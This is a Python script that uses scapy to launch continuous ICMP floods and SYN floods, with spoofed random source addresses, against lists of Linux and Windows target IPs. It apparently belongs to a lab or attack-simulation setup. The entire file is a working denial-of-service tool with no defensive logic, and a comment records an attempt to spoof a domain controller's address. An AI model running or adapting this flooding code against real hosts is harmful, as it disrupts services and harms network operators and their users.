import sys
from pathlib import Path

sys.path.append(str(Path(__file__).parent.parent))

from scapy.layers import inet
from scapy.sendrecv import send
import threading
import time
import random
from utils import random_ip, LINUX_TARGET_IPS, WINDOWS_TARGET_IPS, DOMAIN_CONTROLLER_IP

def icmp_flood_work(p):
    while True:
        send(p, verbose=False)
        time.sleep(random.randrange(30)/1000)

def icmp_flood(target_host):
    # IP spoofing won't work :(
    packet = inet.IP(dst=target_host) / inet.ICMP() # src=DOMAIN_CONTROLLER_IP 
    t = threading.Thread(target=icmp_flood_work, args=(packet,), daemon=True)
    t.start()
    return t

def syn_flood_work(target_host):
    while True:
        packet = inet.IP(dst=target_host, src=random_ip()) / inet.TCP(sport=random.randint(1024, 65535), dport=random.randint(1, 1000), flags="S")
        send(packet, verbose=False)
        time.sleep(random.randrange(30)/1000)

def syn_flood(target_host):
    t = threading.Thread(target=syn_flood_work, args=(target_host,), daemon=True)
    t.start()
    return t

def main():
    icmp_threads = []
    syn_threads = []
    for ip in LINUX_TARGET_IPS + WINDOWS_TARGET_IPS:
        print(f"Flooding {ip}...")
        icmp_threads.append(icmp_flood(ip))
        syn_threads.append(syn_flood(ip))
    input("Press Enter to quit:")

if __name__ == "__main__":
    main()
